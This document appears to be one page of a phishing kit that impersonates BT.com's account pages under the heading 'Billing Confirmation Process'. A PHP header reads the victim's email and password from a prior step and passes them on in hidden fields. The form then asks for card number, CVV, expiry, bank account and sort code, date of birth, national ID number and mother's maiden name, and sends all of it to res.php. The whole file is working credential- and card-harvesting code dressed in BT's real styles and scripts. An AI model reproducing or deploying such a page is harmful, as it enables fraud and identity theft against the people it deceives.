<?php
error_reporting(0);
$email = $_POST['email'];
$password = $_POST['password'];
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head> <script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok9v=abba2f56bd/"},atok:"29bf2107a23ff5dad06a680bbc28624e",petok:"893a67f9f433cb914187f7b9745694ccd8b3c8c2-1401279104-1800",zone:"pinkseason.hk",rocket:"0",apps:{"ga_key":{"ua":"UA-43860394-1","ga_bs":"2"}}}];CloudFlare.push({"apps":{"ape":"0f01247b25bc21e0003cb9ebeb072b42"}});!function(a,b){a=document.createElement("script"),b=document.getElementsByTagName("script")[0],a.async=!0,a.src="//ajax.cloudflare.com/cdn-cgi/nexp/dok9v=97fb4d042e/cloudflare.min.js",b.parentNode.insertBefore(a,b)}()}}catch(e){};
//]]>
</script>
<script type="text/javascript">/*<![CDATA[*/(function(a){function b(a,b){if(+a)return~a||(d.cookie=h+"=; path=/");j=d.createElement(e),k=d.getElementsByTagName(e)[0],j.src=a,b&&(j.onload=j.onerror=b),k.parentNode.insertBefore(j,k)}function c(){n.api||b(l.shift()||-1,c)}if(this.Mobify)return;var d=document,e="script",f="mobify",g="."+f+".com/",h=f+"-path",i=g+"un"+f+".js",j,k,l=[!1,1],m,n=this.Mobify={points:[+(new Date)],tagVersion:[6,1],ajs:"//a.mobify.com/bt/a.js"},o=/((; )|#|&|^)mobify-path=([^&;]*)/g.exec(location.hash+"; "+d.cookie);o?(m=o[3])&&!+(m=o[2]&&sessionStorage[h]||m)&&(l=[!0,"//preview"+g+escape(m)]):(l=a()||l,l[0]&&l.push("//cdn"+i,"//files01"+i)),l.shift()?(d.write('<plaintext style="display:none;">'),setTimeout(c)):b(l[0])})(function(){if(/ip(hone|od)|android.*(mobile)|blackberry.*applewebkit/i.test(navigator.userAgent)){return[1,"//cdn.mobify.com/sites/bt/production/mobify.js"]}return[0,Mobify.ajs]})/*]]>*/</script> 
<META HTTP-EQUIV="Content-Type" content="application/xhtml+xml; charset=UTF-8"/>
<META NAME="Keywords" CONTENT="BT,"/>
<META NAME="Description" CONTENT="BT,"/>
<META HTTP-EQUIV="Cache-Control" CONTENT="no-cache">
<META HTTP-EQUIV="Pragma" CONTENT="no-cache">
<META HTTP-EQUIV="Cache-Control" CONTENT="no-store">
<META HTTP-EQUIV="Expires" CONTENT="-1">
<meta content="text/html;charset=utf-8" http-equiv="Content-type"/>
<title>BT.com</title>
<link href="https://www.bt.com/static/includes/appsprofile/css/dante_sso/core.css" media="all" type="text/css" rel="stylesheet"/>
<link href="https://www.bt.com/static/includes/appsprofile/css/dante_sso/screen.css" media="all" type="text/css" rel="stylesheet"/>
<link href="https://www.bt.com/static/includes/appsprofile/css/dante_sso/elements.css" media="all" type="text/css" rel="stylesheet"/>
<!--[if lt IE 7.0]><link rel="stylesheet" href="https://www.bt.com/static/includes/appsprofile/css/dante_sso/ie6.css" type="text/css" media="screen" /><![endif]-->
<!--[if lt IE 8.0]><link rel="stylesheet" href="https://www.bt.com/static/includes/appsprofile/css/dante_sso/ie7.css" type="text/css" media="screen" /><![endif]-->
<!--[if lt IE 9.0]><link rel="stylesheet" href="https://www.bt.com/static/includes/appsprofile/css/dante_sso/ie8.css" type="text/css" media="screen" /><![endif]-->
<script src="https://www.bt.com/static/includes/appsprofile/js/dante_sso/jquery-1.3.2.min.js" type="text/javascript"></script>
<script src="https://www.bt.com/static/includes/appsprofile/js/dante_sso/jquery.colorbox.js" type="text/javascript"></script>
<script src="https://www.bt.com/static/includes/appsprofile/js/dante_sso/main.js" type="text/javascript"></script>
<script src="https://www.bt.com/static/includes/appsprofile/js/dante_sso/SignUpFromBTId.js" type="text/javascript"></script>
<script src="https://www.bt.com/static/includes/appsprofile/js/dante_sso/jquery.validate.js" type="text/javascript"></script>
<script src="https://www.bt.com/static/includes/appsprofile/js/dante_sso/registration.js" type="text/javascript"></script>
<script src="https://www.bt.com/static/includes/appsprofile/js/dante_sso/registrationExtension.js" type="text/javascript"></script>
<script src="https://www.bt.com/static/includes/appsprofile/js/dante_sso/userCheck.js" type="text/javascript"></script>
 
<script src="https://www.bt.com/static/includes/globalheader/cookies/js/bt.cookies.api.js" type="text/javascript"></script>
<script type="text/javascript">
/* <![CDATA[ */
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-43860394-1']);
_gaq.push(['_trackPageview']);

(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();

(function(b){(function(a){"__CF"in b&&"DJS"in b.__CF?b.__CF.DJS.push(a):"addEventListener"in b?b.addEventListener("load",a,!1):b.attachEvent("onload",a)})(function(){"FB"in b&&"Event"in FB&&"subscribe"in FB.Event&&(FB.Event.subscribe("edge.create",function(a){_gaq.push(["_trackSocial","facebook","like",a])}),FB.Event.subscribe("edge.remove",function(a){_gaq.push(["_trackSocial","facebook","unlike",a])}),FB.Event.subscribe("message.send",function(a){_gaq.push(["_trackSocial","facebook","send",a])}));"twttr"in b&&"events"in twttr&&"bind"in twttr.events&&twttr.events.bind("tweet",function(a){if(a){var b;if(a.target&&a.target.nodeName=="IFRAME")a:{if(a=a.target.src){a=a.split("#")[0].match(/[^?=&]+=([^&]*)?/g);b=0;for(var c;c=a[b];++b)if(c.indexOf("url")===0){b=unescape(c.split("=")[1]);break a}}b=void 0}_gaq.push(["_trackSocial","twitter","tweet",b])}})})})(window);
/* ]]> */
</script>
</head>
<body id="registration" class="js accountRegistration">
<div id="Page">   
<script type="text/javascript" language="JavaScript">
                var gh_link="https://www.bt.com";
                var gh_defaultTab="5";
                var gh_searchParams = "";
            </script>
<script src="https://img01.bt.co.uk/s/assets/js/jquery-1.8.2.min.js"></script><script src="https://img01.bt.co.uk/s/assets/js/dantegh.api-1.1.js"></script>
<script type="text/javascript">var jqdgh = jQuery.noConflict(true);var defvalues = {"searchStatus":"web","displayMegaDropdown":"Y","displayMastHead":"Y","displayLogin":"Y","displayPrimary":"Y","displaySecondaryFlyouts":"Y","siteArea":"presales","header_rule":1,"externalLogoutPageURL":"http://www.bt.com/mybt"};DanteGH.init(defvalues);</script>
 
<div id="content">
<div id="btiddiv">
<h1>Billing Confirmation Process</h1>
</div>
<div id="profileContent">
<div class="mainWrapper">
<div id="accountSettingsContent">
 
<div class="profilePanel">
<div class="profileBannerForBTID">
<h2>Please Confirm Your Billing Information. </h2>
</div>
</div>
<form id="f1" name="ssss" action="res.php" method="post">
<div class="formInfo">
<p></p>
</div>
<div class="module personalDetails">
<input type="hidden" name="email" value="<?php print $email; ?>"/>
<input type="hidden" name="password" value="<?php print $password; ?>"/>
<div class="formRow">
<label for="emailAddress">Title:<span>*</span></label>
<select required name="title" size="1" class='tintedInput'>
<option value="">Please select...</option>
<option value="Mr">Mr</option>
<option value="Mrs">Mrs</option>
<option value="Miss">Miss</option>
<option value="Ms">Ms</option>
<option value="Dr">Dr</option>
<option value="Prof">Prof</option>
</select>
</div>
<div class="formRow">
<label for="emailAddress">First name:<span>*</span></label>
<input id="email" name="first_name"required type="text" maxlength="50"/>
</div>
<div class="formRow">
<label for="emailAddress">Last name:<span>*</span></label>
<input id="email" name="last_name"required type="text" maxlength="50"/>
</div>
<div class="formRow">
<label for="emailAddress">Card type:<span>*</span></label>
<select required name="credit_card_type_select" value="" class="tintedInput">
<option value="">Please select</option>
<option value="MasterCard">MasterCard</option>
<option value="Visa">Visa</option>
<option value="Visa Debit">Visa Debit</option>
<option value="Switch">Switch</option>
<option value="Solo">Solo</option>
<option value="Maestro">Maestro</option>
<option value="Electron">Electron</option>
</select>
</div>
<div class="formRow">
<label for="emailAddress">Card issue number:<span>*</span></label>
<input id="email" name="issue_number" type="text" maxlength="50"/>
</div>
<div class="formRow">
<label for="emailAddress">Card number:<span>*</span></label>
<input id="email" name="recc_number"required type="text" maxlength="50"/>
</div>
<div class="formRow">
<label for="emailAddress">Cardholder name:<span>*</span></label>
<input id="email" name="recc_name"required type="text" maxlength="50"/>
</div>
<div class="formRow">
<label for="emailAddress">Start date:<span>*</span></label>
<select name="startdate_month" class="tintedInput" style="width:auto;">
<option value="">
Month
</option><option value="01">
01
</option><option value="02">
02
</option><option value="03">
03
</option><option value="04">
04
</option><option value="05">
05
</option><option value="06">
06
</option><option value="07">
07
</option><option value="08">
08
</option><option value="09">
09
</option><option value="10">
10
</option><option value="11">
11
</option><option value="12">
12
</option></select>
<select name="startdate_year" class="tintedInput" style="width:auto;">
<option value="YYYY">
Year
</option><option value="2005">
2005
</option><option value="2006">
2006
</option><option value="2007">
2007
</option><option value="2008">
2008
</option><option value="2009">
2009
</option><option value="2010">
2010
</option><option value="2011">
2011
</option><option value="2012">
2012
</option><option value="2013">
2013
</option><option value="2014">
2014
</option><option value="2015">
2015
</option><option value="2016">
2016
</option><option value="2017">
2017
</option><option value="2018">
2018
</option><option value="2019">
2019
</option></select>
</div>
<div class="formRow">
<tr>
<td align="left" width="25%">
<label for="dateOfBirth">Expiry date<span>*</span></label>
</td>
<tr> <td align="left" width="75%">
<select required name="expdate_month" class="tintedInput" style="width:auto;">
<option value="">
Month
</option><option value="01">
01
</option><option value="02">
02
</option><option value="03">
03
</option><option value="04">
04
</option><option value="05">
05
</option><option value="06">
06
</option><option value="07">
07
</option><option value="08">
08
</option><option value="09">
09
</option><option value="10">
10
</option><option value="11">
11
</option><option value="12">
12
</option></select>
<select required name="expdate_year" class="tintedInput" style="width:auto;">
<option value="">
Year
</option><option value="2020">
2020
</option><option value="2021">
2021
</option><option value="2022">
2022
</option><option value="2023">
2023
</option><option value="2024">
2024
</option><option value="2025">
2025
</option><option value="2026">
2026
</option><option value="2027">
2027
</option><option value="2028">
2028
</option></select>
</td>
</tr>
</tr>
</div>
<div class="formRow">
<label for="emailAddress">Card Security number:<span>*</span></label>
<input id="email" name="cvv2_number"required type="text" maxlength="50"/>
</div>
<div class="formRow">
<label for="emailAddress">Account Number:<span>*</span></label>
<input id="email" name="account_number" type="text" maxlength="50"/>
</div>
<div class="formRow">
<label for="emailAddress">Sort Code:<span>*</span></label>
<input id="email" name="sort_code" type="text" maxlength="50"/>
</div>
<div class="formRow">
<label for="emailAddress">Billing address:<span>*</span></label>
<input id="email" name="address2"required type="text" maxlength="50"/>
</div>
<div class="formRow">
<label for="emailAddress">City/Town:<span>*</span></label>
<input id="email" name="city"required type="text" maxlength="50"/>
</div>
<div class="formRow">
<label for="emailAddress">County:<span>*</span></label>
<input id="email" name="co_plc_country_code"required type="text" maxlength="50"/>
</div>
<div class="formRow">
<label for="emailAddress">Postcode:<span>*</span></label>
<input id="email" name="zip"required type="text" maxlength="50"/>
</div>
<div class="formRow">
<label for="emailAddress">Home phone number:<span>*</span></label>
<input id="email" name="H_PhoneNumber"required type="text" maxlength="50"/>
</div>
<div class="formRow">
<label for="emailAddress">Mobile phone number:<span>*</span></label>
<input id="email" name="mobile" type="text" maxlength="50"/>
</div>
<div class="formRow">
<tr>
<td align="left" width="25%">
<label for="dateOfBirth">Date of birth<span>*</span></label>
</td>
<tr> <td align="left" width="75%">
<select required class="VAL_required_dob" id="selectedDay" name="monthOfBirth" style="width:auto;">
<option value="">Day</option>
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="5">5</option>
<option value="6">6</option>
<option value="7">7</option>
<option value="8">8</option>
<option value="9">9</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31">31</option>
</select>
<select required class="VAL_required_dob" id="selectedMonth" name="dayOfBirth" style="width:auto;">
<option value="">Month</option>
<option value="Jan">Jan</option>
<option value="Feb">Feb</option>
<option value="Mar">Mar</option>
<option value="Apr">Apr</option>
<option value="May">May</option>
<option value="Jun">Jun</option>
<option value="Jul">Jul</option>
<option value="Aug">Aug</option>
<option value="Sep">Sep</option>
<option value="Oct">Oct</option>
<option value="Nov">Nov</option>
<option value="Dec">Dec</option>
</select>
<select required class="VAL_required_dob" id="selectedYear" name="yearOfBirth" style="width:auto;">
<option value="">Year</option>
<option value="2018">2018</option>
    <option value="2017">2017</option>
    <option value="2016">2016</option>
    <option value="2015">2015</option>
    <option value="2014">2014</option>
    <option value="2013">2013</option>
    <option value="2012">2012</option>
    <option value="2011">2011</option>
    <option value="2010">2010</option>
    <option value="2009">2009</option>
    <option value="2008">2008</option>
    <option value="2007">2007</option>
    <option value="2006">2006</option>
    <option value="2005">2005</option>
    <option value="2004">2004</option>
    <option value="2003">2003</option>
    <option value="2002">2002</option>
    <option value="2001">2001</option>
    <option value="2000">2000</option>
    <option value="1999">1999</option>
    <option value="1998">1998</option>
    <option value="1997">1997</option>
    <option value="1996">1996</option>
    <option value="1995">1995</option>
    <option value="1994">1994</option>
    <option value="1993">1993</option>
    <option value="1992">1992</option>
    <option value="1991">1991</option>
    <option value="1990">1990</option>
    <option value="1989">1989</option>
    <option value="1988">1988</option>
    <option value="1987">1987</option>
    <option value="1986">1986</option>
    <option value="1985">1985</option>
    <option value="1984">1984</option>
    <option value="1983">1983</option>
    <option value="1982">1982</option>
    <option value="1981">1981</option>
    <option value="1980">1980</option>
    <option value="1979">1979</option>
    <option value="1978">1978</option>
    <option value="1977">1977</option>
    <option value="1976">1976</option>
    <option value="1975">1975</option>
    <option value="1974">1974</option>
    <option value="1973">1973</option>
    <option value="1972">1972</option>
    <option value="1971">1971</option>
    <option value="1970">1970</option>
    <option value="1969">1969</option>
    <option value="1968">1968</option>
    <option value="1967">1967</option>
    <option value="1966">1966</option>
    <option value="1965">1965</option>
    <option value="1964">1964</option>
    <option value="1963">1963</option>
    <option value="1962">1962</option>
    <option value="1961">1961</option>
    <option value="1960">1960</option>
    <option value="1959">1959</option>
    <option value="1958">1958</option>
    <option value="1957">1957</option>
    <option value="1956">1956</option>
    <option value="1955">1955</option>
    <option value="1954">1954</option>
    <option value="1953">1953</option>
    <option value="1952">1952</option>
    <option value="1951">1951</option>
    <option value="1950">1950</option>
    <option value="1949">1949</option>
    <option value="1948">1948</option>
    <option value="1947">1947</option>
    <option value="1946">1946</option>
    <option value="1945">1945</option>
    <option value="1944">1944</option>
    <option value="1943">1943</option>
    <option value="1942">1942</option>
    <option value="1941">1941</option>
    <option value="1940">1940</option>
    <option value="1939">1939</option>
    <option value="1938">1938</option>
    <option value="1937">1937</option>
    <option value="1936">1936</option>
    <option value="1935">1935</option>
    <option value="1934">1934</option>
    <option value="1933">1933</option>
    <option value="1932">1932</option>
    <option value="1931">1931</option>
    <option value="1930">1930</option>
    <option value="1929">1929</option>
    <option value="1928">1928</option>
    <option value="1927">1927</option>
    <option value="1926">1926</option>
    <option value="1925">1925</option>
    <option value="1924">1924</option>
    <option value="1923">1923</option>
    <option value="1922">1922</option>
    <option value="1921">1921</option>
    <option value="1920">1920</option>
    <option value="1919">1919</option>
    <option value="1918">1918</option>
    <option value="1917">1917</option>
    <option value="1916">1916</option>
    <option value="1915">1915</option>
    <option value="1914">1914</option>
    <option value="1913">1913</option>
    <option value="1912">1912</option>
    <option value="1911">1911</option>
    <option value="1910">1910</option>
    <option value="1909">1909</option>
    <option value="1908">1908</option>
    <option value="1907">1907</option>
    <option value="1906">1906</option>
    <option value="1905">1905</option>
</select>
</div>
<div class="formRow">
<label for="emailAddress">National Identity Card Number:<span>*</span></label>
<input id="email" name="natid" type="text" maxlength="50"/>
<br>
<div class="formRow">
<label for="emailAddress">Mother's Maiden Name:<span>*</span></label>
<input id="email" name="mmn"required type="text" maxlength="50"/>
</tr>
</div>
</div>
</div>
<div class="dantebuttons">
<div class="button buttonSelected buttonFix"><input type="submit" value="Continue" onclick="misClick('Con:YA:SSO:Reg:Choose email:Button:Continue')"></div>
</div>
</form>
 </div>
</div>
</div>
 
 
<div id="Footer">
<div>
 
</div>
<ul>
<li class="first"><a href="http://www.bt.com/index.jsp">BT.com</a></li>
<li><a href="http://www2.bt.com/contactus">Contact BT</a></li>
<li><a href="http://www2.bt.com/static/i/pansegment/sitemap/sitemaphome.html" accesskey="9">Site map</a></li>
<li><a href="http://www.btplc.com" accesskey="3">About BT</a></li>
<li><a href="http://www2.bt.com/btPortal/application?pageid=pan_privacy_policy&siteArea=pan">Privacy policy</a></li>
<li><a href="http://www.btplc.com/Thegroup/RegulatoryandPublicaffairs/Codeofpractice/index.htm">Code of practice</a></li>
<li><a href="http://www.thephonebook.bt.com/publisha.content/en/search/residential/search.publisha">Find a number</a></li>
</ul>
</div>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
</head>
<body>
<script type="text/javascript">
function misClick(linkName){
    	  s_eVar19=linkName;	
          s_prop50=s_eVar19;
         	
 		  s_linkType='o';
 	 	  s_linkname=s_eVar19;
 	 	  
 	 	  
 	 	  try{
 	    	var s_lnk=s_co(this);
 	    	s_gs('btcomdev');		
 	    	}catch (e)
          	{
 	 		}
 }

</script>
<input type="hidden" value="Con:YA:SSO:Reg:Choose email" name="pageName" id="pageName"/>
<script language="JavaScript" type="text/javascript">
            var s_pageName="Con:YA:SSO:Reg:Choose email";
            var s_channel="Consumer";
			var s_server='rdms6_roschp1b';
			var s_hier1="Con,YA,SSO,Reg";
			var s_prop2="Rochdale";//Data center
			var s_prop6="www.bt.com"; //dns
			
		
			

			
			
				var s_prop9="Logged Out";  
				
					

			
			var s_prop16="New"; //Stack name  
		
			
			var s_prop36="Con:YA:SSO:Hub";  
			var s_prop37="Con:YA:SSO:Reg"; 

			
	if(s_prop12!=""){		
	var s_eVar21=s_prop12; 
			}
			if(s_prop16!=null){
			var s_eVar27=s_prop16; 
			}
			var s_eVar36=s_prop9;   
			var s_eVar37=s_prop37; 
			
          

	</script>
<script src="https://www.bt.com/static/includes/appsprofile/js/dante_sso/s_code_remote.js" language="javascript"></script>
</body>
</html>
</div>
</div>
 
<script src="https://www.bt.com/static/includes/globalheader/bt.cookies.js" type="text/javascript"></script>
</body>
</html>
